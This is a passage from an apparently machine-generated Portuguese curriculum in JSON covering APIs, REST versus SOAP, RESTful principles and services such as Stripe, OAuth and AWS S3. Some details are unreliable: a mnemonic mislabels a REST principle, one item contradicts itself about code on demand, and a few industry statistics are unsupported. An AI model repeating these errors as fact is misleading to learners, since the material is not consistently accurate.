                                "Crie tabela comparativa com 4 colunas: Tipo, Formato, Performance, Uso Típico.",
                                "Justifique por que um app web usaria GraphQL sobre REST.",
                                "Descreva streaming em gRPC com aplicação em chat mobile."
                              ],
                              "assessmentCriteria": [
                                "Precisão na definição de cada tipo de API (90% correto).",
                                "Comparação abrangente com pelo menos 4 dimensões (formato, performance, etc.).",
                                "Exemplos relevantes para web/mobile em 80% das respostas.",
                                "Uso correto de terminologia técnica (ex: over-fetching, protobuf).",
                                "Tabela ou diagrama visual para comparação clara.",
                                "Justificativas lógicas para casos de uso sem generalizações."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Entender HTTP/2 em gRPC e caching em REST.",
                                "Banco de Dados: Queries GraphQL semelhantes a linguagens de consulta.",
                                "Desenvolvimento Mobile: Integração com React Native/Flutter usando essas APIs.",
                                "Arquitetura de Software: Microservices e padrões de design em escolhas de API.",
                                "Segurança da Informação: Autenticação (OAuth em REST, JWT em GraphQL)."
                              ],
                              "realWorldApplication": "Desenvolvedores no Uber usam gRPC para comunicação entre serviços de ride-matching e pagamentos em apps mobile para baixa latência; Netflix usa GraphQL para recomendações personalizadas em web/mobile, reduzindo tráfego de dados em 50%; apps legacy em bancos mantêm SOAP para compliance regulatório."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.5.1.3",
                            "name": "Reconhecer a importância das APIs na Internet",
                            "description": "Analisar como APIs facilitam a integração de serviços na nuvem, desenvolvimento de apps móveis e ecossistemas distribuídos, com exemplos reais como Twitter API ou Google Maps API.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o Conceito Básico de uma API",
                                  "subSteps": [
                                    "Pesquisar definições oficiais de API de fontes confiáveis como MDN Web Docs ou Wikipedia.",
                                    "Identificar os componentes principais: endpoints, métodos HTTP (GET, POST, etc.) e autenticação.",
                                    "Diferenciar APIs de websites tradicionais, focando no aspecto programático.",
                                    "Visualizar um diagrama simples de cliente-servidor usando API.",
                                    "Explicar em suas palavras o que torna uma API uma 'interface de programação'."
                                  ],
                                  "verification": "Escrever uma definição de API em 3-5 frases e compará-la com uma referência padrão.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Acesso à internet",
                                    "Notebook para anotações",
                                    "Diagrama de API (impresso ou digital)"
                                  ],
                                  "tips": "Use analogias como 'API é como um menu em um restaurante: você pede (requer), e recebe o que pediu (resposta JSON/XML).'",
                                  "learningObjective": "Dominar a definição e componentes fundamentais de uma API para contextualizar sua importância.",
                                  "commonMistakes": [
                                    "Confundir API com UI/UX de sites",
                                    "Ignorar a necessidade de chaves de autenticação",
                                    "Pensar que APIs são apenas para grandes empresas"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar o Papel das APIs na Integração de Serviços na Nuvem",
                                  "subSteps": [
                                    "Estudar casos de serviços na nuvem como AWS ou Google Cloud que usam APIs para integração.",
                                    "Mapear fluxos: como um app acessa armazenamento em nuvem via API.",
                                    "Identificar benefícios: escalabilidade, reutilização de código e redução de redundância.",
                                    "Listar desafios como latência e segurança em integrações.",
                                    "Criar um fluxograma simples de integração nuvem-app via API."
                                  ],
                                  "verification": "Desenhar e descrever um fluxograma de integração que demonstre o uso de API na nuvem.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Ferramenta de desenho online (Draw.io ou papel)",
                                    "Documentação de APIs de nuvem (ex: AWS S3 API)"
                                  ],
                                  "tips": "Foquem em como APIs eliminam a necessidade de recriar funcionalidades existentes.",
                                  "learningObjective": "Reconhecer como APIs habilitam integrações eficientes em ambientes de nuvem distribuídos.",
                                  "commonMistakes": [
                                    "Subestimar questões de segurança como OAuth",
                                    "Confundir integração com hospedagem",
                                    "Ignorar custos de chamadas de API"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar Exemplos Reais de APIs em Apps Móveis e Ecossistemas",
                                  "subSteps": [
                                    "Analisar Twitter API: como desenvolvedores embedem tweets em apps.",
                                    "Estudar Google Maps API: integração em apps de delivery ou navegação.",
                                    "Pesquisar outros exemplos como Stripe API para pagamentos em apps móveis.",
                                    "Comparar antes/depois: desenvolvimento sem vs. com API.",
                                    "Testar uma API pública simples via Postman ou navegador."
                                  ],
                                  "verification": "Listar 3 exemplos reais com descrição de como a API é usada e benefício proporcionado.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Postman ou ferramenta similar",
                                    "Documentação Twitter API e Google Maps API",
                                    "Navegador web"
                                  ],
                                  "tips": "Experimente chamadas reais para ver respostas JSON e entender o poder prático.",
                                  "learningObjective": "Identificar aplicações concretas de APIs em desenvolvimento móvel e ecossistemas.",
                                  "commonMistakes": [
                                    "Usar exemplos desatualizados",
                                    "Não testar autenticação",
                                    "Focar só em APIs famosas sem generalizar"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Avaliar o Impacto das APIs em Ecossistemas Distribuídos",
                                  "subSteps": [
                                    "Discutir ecossistemas como microserviços onde APIs conectam serviços independentes.",
                                    "Analisar vantagens: agilidade no desenvolvimento, manutenção e escalabilidade.",
                                    "Explorar desvantagens: dependência de terceiros e versionamento.",
                                    "Prever tendências futuras como APIs GraphQL vs REST.",
                                    "Resumir em um ensaio curto a importância global das APIs na Internet moderna."
                                  ],
                                  "verification": "Escrever um parágrafo resumindo impactos positivos e negativos em ecossistemas distribuídos.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Notebook",
                                    "Artigos sobre microserviços e APIs (ex: de Martin Fowler)"
                                  ],
                                  "tips": "Pense em como sem APIs, apps como Instagram não integrariam feeds, stories e anúncios.",
                                  "learningObjective": "Sintetizar a importância estratégica das APIs para sistemas distribuídos e inovação.",
                                  "commonMistakes": [
                                    "Superestimar benefícios sem mencionar riscos",
                                    "Ignorar evolução tecnológica",
                                    "Generalizar demais sem exemplos"
                                  ]
                                }
                              ],
                              "practicalExample": "Integre a Google Maps API em um site simples de delivery: insira um endereço via formulário, use a API para geocodificar e exibir mapa interativo, demonstrando como APIs aceleram o desenvolvimento sem recriar motores de mapa.",
                              "finalVerifications": [
                                "Explicar verbalmente o que é uma API e seus componentes principais.",
                                "Citar e descrever pelo menos dois exemplos reais de APIs (ex: Twitter, Google Maps).",
                                "Desenhar um diagrama de integração via API em nuvem ou app móvel.",
                                "Listar 3 benefícios e 2 desafios das APIs em ecossistemas distribuídos.",
                                "Demonstrar uma chamada de API pública bem-sucedida.",
                                "Resumir em 1 minuto a importância das APIs para a Internet moderna."
                              ],
                              "assessmentCriteria": [
                                "Precisão conceitual: definições e componentes corretos (30%).",
                                "Uso de exemplos reais e relevantes (25%).",
                                "Análise de benefícios e desafios equilibrada (20%).",
                                "Criatividade em analogias e diagramas (15%).",
                                "Demonstração prática via teste de API (10%)."
                              ],
                              "crossCurricularConnections": [
                                "Programação: Desenvolvimento de software e chamadas HTTP/REST.",
                                "Redes de Computadores: Protocolos, autenticação e segurança (OAuth).",
                                "Administração: Modelos de negócios baseados em APIs (SaaS).",
                                "Matemática: Lógica de fluxos e algoritmos de integração.",
                                "Empreendedorismo: Inovação via ecossistemas de APIs abertas."
                              ],
                              "realWorldApplication": "Empresas como Uber e Netflix usam APIs para integrar serviços de mapas, pagamentos e streaming em tempo real, permitindo escalabilidade global, atualizações rápidas e parcerias sem reconstruir infraestruturas do zero."
                            },
                            "estimatedTime": "0.5 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.1.5.2",
                        "name": "Serviços Web",
                        "description": "Serviços baseados na web que utilizam protocolos padrão para fornecer funcionalidades remotas, promovendo interoperabilidade entre aplicações heterogêneas.",
                        "specificSkills": [
                          {
                            "id": "10.1.1.5.2.1",
                            "name": "Comparar REST e SOAP",
                            "description": "Descrever as diferenças entre serviços web REST (stateless, baseado em HTTP) e SOAP (baseado em XML, com envelopes padronizados), incluindo vantagens e desvantagens.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender os Fundamentos do REST",
                                  "subSteps": [
                                    "Pesquise a definição de REST (Representational State Transfer) como um estilo arquitetural para serviços web.",
                                    "Identifique os princípios principais: stateless, client-server, cacheable, layered system, code on demand (opcional) e uniform interface.",
                                    "Estude como REST usa métodos HTTP (GET, POST, PUT, DELETE) e URIs para recursos.",
                                    "Analise exemplos de payloads em JSON ou XML via ferramentas como Postman.",
                                    "Registre notas sobre como REST é baseado em HTTP sem envelopes obrigatórios."
                                  ],
                                  "verification": "Crie um diagrama simples mostrando um request REST e confirme que ele é stateless (sem estado entre chamadas).",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação oficial de REST (Roy Fielding's dissertation)",
                                    "Postman ou Insomnia para testes",
                                    "Notebook para anotações"
                                  ],
                                  "tips": "Comece com exemplos reais de APIs públicas como JSONPlaceholder para praticar chamadas GET/POST.",
                                  "learningObjective": "Compreender os princípios arquiteturais do REST e sua dependência em HTTP.",
                                  "commonMistakes": [
                                    "Confundir REST com um protocolo (é um estilo)",
                                    "Ignorar o statelessness, achando que sessões são permitidas no protocolo"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Entender os Fundamentos do SOAP",
                                  "subSteps": [
                                    "Defina SOAP (Simple Object Access Protocol) como um protocolo para troca de mensagens XML estruturadas.",
                                    "Explore a estrutura: Envelope (header + body), com suporte a WS-Security e transações.",
                                    "Aprenda sobre WSDL (Web Services Description Language) para descrever serviços SOAP.",
                                    "Teste um endpoint SOAP público usando ferramentas como SoapUI.",
                                    "Note como SOAP é independente de transporte (HTTP, SMTP) mas comumente usa HTTP."
                                  ],
                                  "verification": "Parse um XML de envelope SOAP e identifique header, body e fault elements.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "SoapUI ou Postman com suporte SOAP",
                                    "Exemplos de WSDL de serviços públicos como weather services",
                                    "Especificação SOAP 1.2"
                                  ],
                                  "tips": "Use SoapUI para gerar requests automáticos a partir de WSDL para visualizar a verbosidade.",
                                  "learningObjective": "Dominar a estrutura XML e o ecossistema de protocolos relacionados ao SOAP.",
                                  "commonMistakes": [
                                    "Achar que SOAP é stateless (pode manter estado via headers)",
                                    "Ignorar a obrigatoriedade de XML e envelopes padronizados"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificar Diferenças Principais entre REST e SOAP",
                                  "subSteps": [
                                    "Crie uma tabela comparativa: Protocolo vs Estilo (SOAP: protocolo XML; REST: estilo HTTP).",
                                    "Compare statelessness (REST obrigatório; SOAP flexível), formato de dados (JSON/XML flexível vs XML rígido).",
                                    "Analise verbosidade (REST leve; SOAP pesado com envelopes), suporte a operações (REST via HTTP methods; SOAP via RPC).",
                                    "Discuta discovery (REST: HATEOAS opcional; SOAP: WSDL obrigatório).",
                                    "Registre diferenças em segurança e performance."
                                  ],
                                  "verification": "Preencha uma tabela com pelo menos 8 diferenças chave e valide com fontes confiáveis.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Planilha Google Sheets ou Excel para tabela",
                                    "Artigos comparativos de sites como Stack Overflow ou Baeldung"
                                  ],
                                  "tips": "Use cores na tabela para destacar diferenças (verde para REST, vermelho para SOAP).",
                                  "learningObjective": "Mapear diferenças técnicas fundamentais entre REST e SOAP.",
                                  "commonMistakes": [
                                    "Generalizar SOAP como sempre mais lento sem considerar cenários",
                                    "Omitir diferenças em tooling e suporte a linguagens"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar Vantagens e Desvantagens de Cada Um",
                                  "subSteps": [
                                    "Liste vantagens do REST: Simplicidade, escalabilidade, caching HTTP, ampla adoção.",
                                    "Liste desvantagens do REST: Menos padronização em segurança, sem built-in transações.",
                                    "Liste vantagens do SOAP: Padronização (WS-*), suporte enterprise (segurança, confiabilidade), ACID transações.",
                                    "Liste desvantagens do SOAP: Verbosidade, overhead de processamento XML, curva de aprendizado.",
                                    "Crie cenários onde um é preferível ao outro (ex: microservices REST; banking SOAP)."
                                  ],
                                  "verification": "Escreva um parágrafo justificando a escolha de REST vs SOAP para um app de e-commerce.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Casos de estudo de empresas (Netflix usa REST; bancos usam SOAP)",
                                    "Notebook ou Markdown para listas"
                                  ],
                                  "tips": "Pondere prós/contras com exemplos numéricos de performance quando possível.",
                                  "learningObjective": "Avaliar trade-offs práticos para seleção em projetos reais.",
                                  "commonMistakes": [
                                    "Viés para REST ignorando nichos enterprise do SOAP",
                                    "Não considerar evolução (GraphQL como alternativa)"
                                  ]
                                }
                              ],
                              "practicalExample": "Desenvolva um serviço simples de 'Gerenciar Usuários': Implemente endpoints REST (GET /users, POST /users) usando Node.js/Express e compare com um serviço SOAP equivalente via Java/JAX-WS. Meça tempo de resposta e tamanho de payload para 100 requests simulados com Apache JMeter.",
                              "finalVerifications": [
                                "Pode listar e explicar 5 diferenças chave sem consultar notas.",
                                "Cria uma tabela comparativa precisa com vantagens/desvantagens.",
                                "Identifica cenários ideais para cada (ex: mobile app -> REST).",
                                "Explica impacto de stateless vs stateful em escalabilidade.",
                                "Compara payloads reais de exemplos práticos.",
                                "Discute limitações atuais (ex: REST sem WS-Security nativo)."
                              ],
                              "assessmentCriteria": [
                                "Precisão nas diferenças técnicas (80% correto).",
                                "Profundidade na análise de prós/contras com exemplos (nota 4/5).",
                                "Capacidade de aplicar em cenários reais (rubrica qualitativa).",
                                "Clareza na tabela ou diagrama comparativo.",
                                "Evidência de prática com ferramentas (screenshots de requests).",
                                "Compreensão de evoluções (menciona gRPC ou GraphQL)."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Entender HTTP/1.1 vs SOAP over HTTP.",
                                "Segurança da Informação: WS-Security em SOAP vs OAuth/JWT em REST.",
                                "Desenvolvimento de Software: Integração em microsserviços (REST dominante).",
                                "Banco de Dados: Transações ACID via SOAP vs eventual consistency em REST.",
                                "Administração: Custos de manutenção (REST mais simples)."
                              ],
                              "realWorldApplication": "Em empresas como Google ou AWS, REST é usado para APIs públicas escaláveis (ex: Google Maps API); SOAP persiste em setores regulados como finanças (ex: SWIFT para transferências bancárias) por compliance e transações seguras."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.5.2.2",
                            "name": "Aplicar princípios RESTful",
                            "description": "Explicar os seis princípios REST (uniform interface, client-server, stateless, cacheable, layered system, code on demand) e como eles são implementados em serviços web modernos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Seis Princípios Fundamentais do REST",
                                  "subSteps": [
                                    "Leia e anote as definições oficiais dos seis princípios: uniform interface, client-server, stateless, cacheable, layered system e code on demand.",
                                    "Estude diagramas ilustrando cada princípio em serviços web como HTTP.",
                                    "Compare REST com arquiteturas não-REST, como SOAP, destacando diferenças.",
                                    "Crie um mapa mental conectando cada princípio a exemplos cotidianos (ex: uniform interface como URLs padronizadas).",
                                    "Resuma cada princípio em uma frase curta e liste benefícios para serviços web modernos."
                                  ],
                                  "verification": "Produzir um documento ou slide com resumo preciso de cada princípio, sem erros conceituais.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Documentação oficial de Roy Fielding sobre REST (tese original)",
                                    "Artigo 'RESTful Web Services' no site da InfoQ",
                                    "Vídeo explicativo no YouTube sobre princípios REST (canal freeCodeCamp)"
                                  ],
                                  "tips": [
                                    "Use analogias: stateless como uma conversa sem memória de interações anteriores.",
                                    "Foquem em HTTP como protocolo principal para implementação RESTful.",
                                    " memorize com acrônimo: U-S-C-L-C-C (Uniform, Server, Cacheable, Layered, Client-server, Code)."
                                  ],
                                  "learningObjective": "Explicar com precisão os seis princípios REST e seus benefícios em serviços web modernos.",
                                  "commonMistakes": [
                                    "Confundir client-server com stateless (client-server é separação, stateless é ausência de estado no servidor).",
                                    "Ignorar code on demand como opcional, mas essencial para extensibilidade.",
                                    "Achar que REST requer XML/JSON específico (uniform interface foca em recursos hipermedia)."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Projetar uma Interface Uniforme e Recursos Identificáveis",
                                  "subSteps": [
                                    "Defina recursos da API (ex: /users, /users/{id}) seguindo convenções HATEOAS.",
                                    "Esboce métodos HTTP: GET (leitura), POST (criação), PUT/PATCH (atualização), DELETE.",
                                    "Inclua representações padronizadas (JSON com links para navegação).",
                                    "Planeje manipulação via representações (client envia dados completos ou parciais).",
                                    "Desenhe um diagrama ER ou fluxograma da API demonstrando uniform interface."
                                  ],
                                  "verification": "Gerar um blueprint da API (usando Swagger ou Postman Collection) com endpoints uniformes e links HATEOAS.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Ferramenta Swagger/OpenAPI para documentação",
                                    "Postman para mock de endpoints",
                                    "Guia de melhores práticas RESTful da Microsoft Docs"
                                  ],
                                  "tips": [
                                    "Sempre use substantivos para recursos (não verbos: /getUsers → /users).",
                                    "Inclua _links para HATEOAS desde o design.",
                                    "Versione a API no path: /v1/users."
                                  ],
                                  "learningObjective": "Projetar APIs com interface uniforme, identificadores de recursos e suporte a hipermedia.",
                                  "commonMistakes": [
                                    "Usar verbos em URLs (ex: /getUser), violando uniform interface.",
                                    "Ignorar códigos de status HTTP apropriados (200, 201, 404, etc.).",
                                    "Não planejar representações auto-descritivas (sem schema ou links)."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar Separação Client-Server, Stateless e Cacheabilidade",
                                  "subSteps": [
                                    "Configure um servidor simples (Node.js/Express) separado do client (HTML/JS fetch).",
                                    "Garanta stateless: cada request contém todo contexto necessário (ex: token JWT em header).",
                                    "Adicione headers de cache (ETag, Cache-Control, Last-Modified) nos responses.",
                                    "Teste stateless simulando múltiplos requests sem sessão no servidor.",
                                    "Implemente client-side caching com service workers ou localStorage."
                                  ],
                                  "verification": "Executar requests consecutivos alterando auth token e confirmar que servidor não mantém estado; verificar headers de cache no DevTools.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Node.js e Express.js instalados",
                                    "Postman ou Insomnia para testes",
                                    "Documentação HTTP caching no MDN Web Docs"
                                  ],
                                  "tips": [
                                    "Use JWT para stateless auth em vez de sessions.",
                                    "Defina Cache-Control: max-age=3600 para recursos estáticos.",
                                    "Separe concerns: client lida com UI, server com dados."
                                  ],
                                  "learningObjective": "Construir APIs stateless, escaláveis com cache e separação clara client-server.",
                                  "commonMistakes": [
                                    "Armazenar sessão no servidor (viola stateless).",
                                    "Omitir headers de cache, causando requests desnecessários.",
                                    "Misturar lógica de UI no servidor (quebra client-server)."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar Arquitetura em Camadas e Code on Demand com Testes Finais",
                                  "subSteps": [
                                    "Estruture camadas: controller → service → repository (ex: com banco mock ou SQLite).",
                                    "Implemente code on demand enviando scripts JS para execução client-side (ex: extensões dinâmicas).",
                                    "Adicione balanceador de carga simulado (proxy reverso com nginx mock).",
                                    "Teste layered system isolando camadas e verificando independência.",
                                    "Execute testes end-to-end cobrindo todos princípios."
                                  ],
                                  "verification": "Documentar testes mostrando que API funciona atrás de proxy e executa code on demand sem quebrar camadas.",
                                  "estimatedTime": "2.5 horas",
                                  "materials": [
                                    "SQLite ou JSON file para persistence",
                                    "NGINX para simular layered proxy",
                                    "Jest ou Mocha para testes automatizados"
                                  ],
                                  "tips": [
                                    "Use injeção de dependências para camadas soltas.",
                                    "Code on demand: sirva JS para validações client-side.",
                                    "Monitore logs para confirmar invisibilidade de camadas internas."
                                  ],
                                  "learningObjective": "Integrar layered system e code on demand para APIs robustas e extensíveis.",
                                  "commonMistakes": [
                                    "Expor detalhes internos de camadas (ex: DB queries no response).",
                                    "Implementar code on demand sem sandbox de segurança.",
                                    "Ignorar escalabilidade em design de camadas."
                                  ]
                                }
                              ],
                              "practicalExample": "Desenvolva uma API RESTful para gerenciamento de uma biblioteca (/books, /books/{id}, /authors), usando Node.js/Express com SQLite. Implemente CRUD com autenticação JWT (stateless), caching ETag, links HATEOAS, proxy NGINX para layered system e um script JS dinâmico para validação client-side (code on demand). Teste com Postman.",
                              "finalVerifications": [
                                "Lista precisa dos seis princípios REST com exemplos implementados.",
                                "API responde corretamente a requests stateless com tokens variados.",
                                "Headers de cache reduzem requests em 50% em testes repetidos.",
                                "Estrutura em camadas permite trocar DB sem alterar controller.",
                                "Client executa code on demand carregado do servidor sem erros.",
                                "Documentação Swagger cobre uniform interface com links hipermedia."
                              ],
                              "assessmentCriteria": [
                                "Precisão conceitual: 100% dos princípios explicados corretamente.",
                                "Funcionalidade código: Todos endpoints CRUD operam sem violações REST.",
                                "Desempenho: Cache reduz latência em requests repetidos.",
                                "Escalabilidade: Camadas independentes comprovadas via testes de isolamento.",
                                "Conformidade HATEOAS: Pelo menos 80% responses incluem _links.",
                                "Segurança: Stateless auth previne vazamento de estado."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Protocolos HTTP/HTTPS e headers semânticos.",
                                "Banco de Dados: Modelagem de recursos persistentes e queries otimizadas.",
                                "Segurança da Informação: Autenticação stateless com JWT/OAuth.",
                                "Desenvolvimento Ágil: Integração contínua de APIs em microsserviços.",
                                "Engenharia de Software: Padrões arquiteturais e design de interfaces."
                              ],
                              "realWorldApplication": "Implementação de APIs em plataformas como GitHub (REST API para repositórios), Stripe (pagamentos cacheáveis e stateless) ou Netflix (microsserviços layered com code on demand para personalização client-side), permitindo escalabilidade global e integrações seamless em apps web/mobile."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.1.5.1.1"
                            ]
                          },
                          {
                            "id": "10.1.1.5.2.3",
                            "name": "Explorar exemplos de serviços web",
                            "description": "Identificar e descrever serviços web comuns como APIs de pagamento (Stripe), autenticação (OAuth) e armazenamento (AWS S3), relacionando-os à arquitetura de aplicações para Internet.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender os Fundamentos de Serviços Web",
                                  "subSteps": [
                                    "Defina o que são serviços web e sua importância em aplicações para Internet.",
                                    "Identifique características comuns como APIs RESTful, HTTP/HTTPS e JSON/XML.",
                                    "Liste categorias de serviços web: pagamento, autenticação e armazenamento.",
                                    "Pesquise exemplos genéricos de cada categoria.",
                                    "Anote como serviços web promovem escalabilidade e reutilização de código."
                                  ],
                                  "verification": "Crie um mapa mental ou lista com definições e 3 exemplos por categoria de serviços web.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Navegador web",
                                    "Notebook ou ferramenta de mind mapping (ex: Draw.io)",
                                    "Documentação geral sobre APIs (MDN Web Docs)"
                                  ],
                                  "tips": "Comece com definições simples e evite mergulhar em código ainda; foque no 'porquê' e 'como' funcionam em alto nível.",
                                  "learningObjective": "Compreender o conceito e o papel dos serviços web na arquitetura de aplicações distribuídas.",
                                  "commonMistakes": [
                                    "Confundir serviços web com páginas web estáticas",
                                    "Ignorar o uso de protocolos como HTTPS para segurança",
                                    "Subestimar a importância da documentação oficial"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar a API de Pagamento Stripe",
                                  "subSteps": [
                                    "Acesse a documentação oficial do Stripe e leia a visão geral.",
                                    "Identifique endpoints principais como criação de charges e customers.",
                                    "Analise um exemplo de integração básica em JavaScript ou Python.",
                                    "Descreva como o Stripe lida com webhooks para notificações.",
                                    "Relacione com fluxos de e-commerce: checkout e reembolsos."
                                  ],
                                  "verification": "Resuma em 5 pontos chave o funcionamento do Stripe e desenhe um diagrama de fluxo de pagamento.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Site oficial Stripe.com/docs",
                                    "Conta gratuita Stripe (sandbox)",
                                    "Editor de texto para diagramas"
                                  ],
                                  "tips": "Use o modo sandbox para testes sem custos reais; foque em fluxos de pagamento recorrentes.",
                                  "learningObjective": "Descrever o Stripe como serviço de pagamento e seu uso em aplicações web.",
                                  "commonMistakes": [
                                    "Não ativar sandbox mode",
                                    "Confundir chaves de API pública e secreta",
                                    "Ignorar conformidade PCI"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar o Protocolo de Autenticação OAuth",
                                  "subSteps": [
                                    "Estude a documentação OAuth 2.0 e fluxos como Authorization Code.",
                                    "Compare OAuth com autenticação básica (login/senha).",
                                    "Explore implementações como Google OAuth ou Auth0.",
                                    "Identifique tokens de access e refresh, e seu papel na segurança.",
                                    "Simule um fluxo de login via OAuth em um playground online."
                                  ],
                                  "verification": "Explique o fluxo OAuth em um diagrama sequencial e liste 3 provedores OAuth comuns.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "OAuth.net ou Auth0 docs",
                                    "OAuth Playground (oauth.com/playground)",
                                    "Ferramenta de diagrama (ex: Lucidchart)"
                                  ],
                                  "tips": "Visualize o fluxo com setas entre cliente, servidor de auth e resource server para clareza.",
                                  "learningObjective": "Entender OAuth como serviço de autenticação segura e delegada.",
                                  "commonMistakes": [
                                    "Confundir OAuth com OpenID Connect",
                                    "Expor tokens de access em URLs",
                                    "Não renovar tokens de refresh"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Explorar Armazenamento em Nuvem com AWS S3",
                                  "subSteps": [
                                    "Acesse a documentação AWS S3 e crie uma conta gratuita.",
                                    "Aprenda conceitos: buckets, objetos, ACLs e presigned URLs.",
                                    "Teste upload/download de arquivos via console AWS.",
                                    "Analise integração com apps web via SDKs (JavaScript).",
                                    "Discuta escalabilidade e custos de armazenamento."
                                  ],
                                  "verification": "Faça upload de um arquivo teste para um bucket S3 e gere uma presigned URL funcional.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Console AWS (aws.amazon.com/free)",
                                    "AWS S3 docs",
                                    "SDK JS via CDN para teste"
                                  ],
                                  "tips": "Use buckets públicos para testes iniciais, mas aprenda sobre políticas IAM para produção.",
                                  "learningObjective": "Dominar AWS S3 como serviço de armazenamento object-based para apps web.",
                                  "commonMistakes": [
                                    "Deixar buckets públicos acidentalmente",
                                    "Exceder limites gratuitos sem monitorar",
                                    "Ignorar versioning de objetos"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Relacionar Serviços Web à Arquitetura de Aplicações para Internet",
                                  "subSteps": [
                                    "Desenhe uma arquitetura de app web integrando Stripe, OAuth e S3.",
                                    "Identifique camadas: frontend, backend, serviços externos.",
                                    "Discuta benefícios: microserviços, desacoplamento e escalabilidade.",
                                    "Analise desafios: latência, falhas e autenticação entre serviços.",
                                    "Crie um exemplo de diagrama de alto nível para um e-commerce."
                                  ],
                                  "verification": "Produza um diagrama de arquitetura mostrando integrações e fluxos de dados entre os serviços.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Ferramenta de diagrama (Draw.io ou Excalidraw)",
                                    "Notas dos steps anteriores"
                                  ],
                                  "tips": "Use notação C4 para diagramas simples; destaque pontos de integração via API calls.",
                                  "learningObjective": "Relacionar serviços web específicos à arquitetura modular de aplicações Internet.",
                                  "commonMistakes": [
                                    "Representar serviços como monolíticos",
                                    "Omitir tratamento de erros em integrações",
                                    "Ignorar orquestração com ferramentas como API Gateway"
                                  ]
                                }
                              ],
                              "practicalExample": "Desenvolva um protótipo de e-commerce simples em HTML/JS: integre Stripe para checkout simulado, OAuth via Google para login de usuário, e AWS S3 para upload de fotos de produtos, demonstrando chamadas API reais em sandbox.",
                              "finalVerifications": [
                                "Liste e descreva com precisão Stripe, OAuth e AWS S3.",
                                "Desenhe diagramas corretos de fluxos individuais e integrados.",
                                "Explique benefícios e desafios na arquitetura de apps web.",
                                "Realize testes práticos em sandboxes sem erros.",
                                "Relacione serviços a cenários reais como e-commerce.",
                                "Identifique pelo menos 3 conexões com escalabilidade cloud."
                              ],
                              "assessmentCriteria": [
                                "Precisão e completude nas descrições técnicas (80%+ acurácia).",
                                "Qualidade dos diagramas e exemplos práticos (clareza visual).",
                                "Profundidade na relação com arquitetura de aplicações.",
                                "Evidência de testes hands-on (screenshots ou logs).",
                                "Criatividade em conexões interdisciplinares e aplicações reais.",
                                "Ausência de erros comuns identificados nos steps."
                              ],
                              "crossCurricularConnections": [
                                "Segurança da Informação: OAuth e políticas de acesso S3.",
                                "Administração e Negócios: Modelos de pagamento Stripe em e-commerce.",
                                "Cloud Computing: Escalabilidade e custos do AWS S3.",
                                "Desenvolvimento de Software: Integração de APIs em microsserviços.",
                                "Redes de Computadores: Protocolos HTTP e webhooks."
                              ],
                              "realWorldApplication": "Em plataformas como Shopify ou Netflix, Stripe processa milhões de transações diárias, OAuth autentica usuários via redes sociais reduzindo senhas locais, e AWS S3 armazena petabytes de mídia e dados de usuários, permitindo apps escaláveis e globais sem infraestrutura própria."
                            },
                            "estimatedTime": "0.5 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.1.5.3",
                        "name": "Protocolos e Formatos de Dados",
                        "description": "Protocolos de rede e formatos de serialização utilizados em APIs e serviços web para troca segura e eficiente de dados entre aplicações distribuídas.",
                        "specificSkills": [
                          {
                            "id": "10.1.1.5.3.1",
                            "name": "Utilizar HTTP/HTTPS em APIs",
                            "description": "Descrever métodos HTTP (GET, POST, PUT, DELETE), status codes (200, 404, 500) e segurança com HTTPS em contextos de serviços web.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
